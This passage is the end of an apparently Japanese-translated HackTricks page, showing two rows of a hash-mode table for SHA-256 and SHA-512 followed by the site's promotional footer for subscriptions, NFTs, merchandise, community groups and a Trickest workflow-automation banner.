1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も**高度なコミュニティツール**によって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
